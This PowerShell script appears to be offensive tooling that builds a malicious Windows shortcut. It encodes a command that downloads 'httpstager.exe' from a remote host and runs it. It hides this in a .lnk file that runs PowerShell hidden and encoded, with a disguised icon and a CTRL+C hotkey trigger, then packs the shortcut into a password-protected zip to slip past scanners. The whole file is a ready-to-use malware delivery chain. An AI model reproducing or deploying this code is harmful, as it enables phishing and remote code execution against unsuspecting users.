$url = "http://10.10.10.10:8080/httpstager.exe"
$dlpath = "$env:APPDATA\stager.exe"
$payload = "Invoke-WebRequest -Uri '$url' -OutFile '$dlpath'; Start-Process '$dlpath'"
$enc_payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))

$path = "$([Environment]::GetFolderPath('Desktop'))\demo.lnk"
$wshell = New-Object -ComObject Wscript.Shell
$shortcut = $wshell.CreateShortcut($path)
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-nop -w hidden -enc " + $enc_payload
$shortcut.WorkingDirectory = "C:"
$shortcut.Hotkey = "CTRL+C"
$shortcut.Description = "Demo"
$shortcut.WindowStyle = 7 
$shortcut.Save()

$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
Compress-7zip -Path $path -ArchiveFileName "demo.zip" -Format Zip - SecurePassword $password
